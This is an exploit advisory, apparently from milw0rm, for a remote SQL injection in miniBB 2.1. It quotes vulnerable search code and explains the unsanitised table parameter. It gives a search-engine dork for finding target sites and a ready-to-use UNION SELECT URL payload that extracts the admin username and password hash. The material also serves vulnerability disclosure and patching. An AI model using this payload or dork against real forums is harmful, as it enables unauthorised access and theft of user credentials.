@@ -1,0 +1,40 @@
+  vuln.: miniBB 2.1 (table) Remote SQL Injection Exploit
+  download: http://www.minibb.net/download.php?file=minibb21
+  dork: "These forums are running on" "miniBB"
+
+  author: irk4z@yahoo.pl
+  greets to: str0ke, polish under :*
+'-----------------------------------------------------------------------------'
+
+ # code:
+
+  /bb_func_search.php:
+       ...
+   41    if(isset($_GET['where'])) $where=$_GET['where']+0; else $where=0;
+       ...
+
+       ...
+  188    if($where==0) { $date_field='post_time'; $poster_field='poster_name'; $table=$Tp; }
+  189    elseif($where==1) { $date_field='topic_time'; $poster_field='topic_poster_name'; $table=$Tt; }
+       ...
+
+       ...
+  215    if($row=db_searchSelect(0,$table,'count(*)',$sqlStr)) $numRows=$row[0]; else $numRows=0;
+  216       if($numRows==0){
+  217        $searchResults='<span class="txtSm">'.$l_searchFailed.'</span>';
+  218       }
+  219       else{
+  220        $warning=$l_recordsFound.' '.$numRows;
+       ...
+
+ SQL query: "select count(*) from $table where $sqlStr" <- sql-inj in $table
+ so if register_globals = On, we can get usernames and passwords from database
+ in hex, and unhex it (http://www.paulschou.com/tools/xlate/) ;]
+ 
+  
+ # p0c:
+ 
+     http://[site]/[path]/index.php?action=search&where=3&searchGo=1&table=[SQL]
+     http://[site]/[path]/index.php?action=search&where=3&searchGo=1&table=minibbtable_posts/**/LIMIT/**/0/**/UNION/**/SELECT/**/hex(concat(username,0x20,user_password))/**/FROM/**/minibbtable_users/**/WHERE/**/user_id=1/*
+
+# milw0rm.com [2007-10-30]
